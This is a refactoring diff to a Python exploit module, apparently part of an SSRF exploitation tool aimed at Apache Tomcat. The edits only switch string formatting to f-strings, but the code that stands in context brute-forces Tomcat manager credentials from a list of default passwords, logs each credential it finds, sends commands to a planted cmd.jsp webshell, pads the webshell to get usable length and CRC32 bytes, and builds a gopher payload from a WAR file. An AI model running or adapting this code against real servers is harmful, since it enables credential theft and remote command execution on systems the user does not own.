@@ -36,7 +36,7 @@ class exploit():
     tomcat_pass = ["password", "tomcat", "admin", "manager", "role1", "changethis", "changeme", "r00t", "root", "s3cret","Password1", "password1"]
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
         self.args = args
 
         # Using a generator to create the host list
@@ -48,7 +48,7 @@ class exploit():
                     r = requester.do_request(args.param, payload)
 
                     if r != None and not "s3cret" in r.text:
-                        logging.info("Found credential \033[32m{}\033[0m:\033[32m{}\033[0m".format(usr, pss))
+                        logging.info(f"Found credential \033[32m{usr}\033[0m:\033[32m{pss}\033[0m")
                         self.SERVER_USER = usr
                         self.SERVER_PASS = pss
 
@@ -61,9 +61,9 @@ class exploit():
                             r = requester.do_request(args.param, payload)
                             
                             if args.verbose == True:
-                                logging.info("Generated payload : {}".format(payload))
+                                logging.info(f"Generated payload : {payload}")
 
-                            logging.info("Sending CMD to cmd.jsp for padding: {}".format(i))
+                            logging.info(f"Sending CMD to cmd.jsp for padding: {i}")
                             payload = wrapper_http("cmd/cmd.jsp?cmd=whoami", self.SERVER_HOST, self.SERVER_PORT)
                             r = requester.do_request(args.param, payload)
                             if r.text != None and r.text != "":
@@ -101,12 +101,12 @@ class exploit():
         modded_length=0
         
         if self.args.verbose == True:
-            logging.info("Original file length: {}".format('{0:0{1}X}'.format(len(webshell_data),8)))
-            logging.info("Original file crc32: {}".format(format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x')))
+            logging.info(f"Original file length: {len(webshell_data):08X}")
+            logging.info(f"Original file crc32: {binascii.crc32(webshell_data.encode())& 0xffffffff:x}")
         
         while valid_length == 0 or valid_crc32 == 0:
-            crc_string = format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x')
-            ws_len_byte_string = '{0:0{1}X}'.format(len(webshell_data),8)
+            crc_string = f"{binascii.crc32(webshell_data.encode())& 0xffffffff:x}"
+            ws_len_byte_string = f"{len(webshell_data):08X}"
             valid_length=1
             valid_crc32=1
             lead_byte_locations = [0,2,4,6]
@@ -123,13 +123,13 @@ class exploit():
         if modded_length > 0:
             logging.info("The input file CRC32 or file length contained an invalid byte.")
             logging.info("Length adjustment completed. " + str(modded_length) + " whitespace ' ' chars were added to the webshell input.")
-            logging.info("New file length: " +'{0:0{1}X}'.format(len(webshell_data),8))
-            logging.info("New file crc32: " + format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x'))
+            logging.info(f"New file length: {len(webshell_data):08X}")
+            logging.info(f"New file crc32: {binascii.crc32(webshell_data.encode())& 0xffffffff:x}")
         return webshell_data
 
     def url_encode_all(self, string):
-        return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)
-        
+        return "".join([f"%{ord(char):0>2x}" for char in string])
+
     def build_gopher_payload(self):
         warfile = ""
         with open(self.EXPLOIT_WAR, 'rb') as f:
